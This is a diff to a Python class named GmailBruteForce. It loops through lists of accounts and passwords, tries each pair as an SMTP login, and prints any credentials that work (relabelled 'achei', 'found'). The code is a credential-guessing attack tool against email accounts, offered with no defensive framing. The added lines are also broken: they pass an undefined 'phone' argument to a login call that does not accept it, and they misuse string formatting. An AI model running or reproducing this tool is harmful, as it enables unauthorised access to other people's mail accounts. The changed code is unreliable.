@@ -30,15 +30,15 @@ class GmailBruteForce():
         for user in self.accounts:
             for password in self.passwords:
                 try:
-                    self.smtp.login(user,password)
-                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
+                    self.smtp.login(user,password,phone)
+                    print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password % phone )) 
 			
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
                 except smtplib.SMTPAuthenticationError:
                     # print("\033[1;31msorry \033[1;m")
-                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
+                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))  
 
 print('''
 	
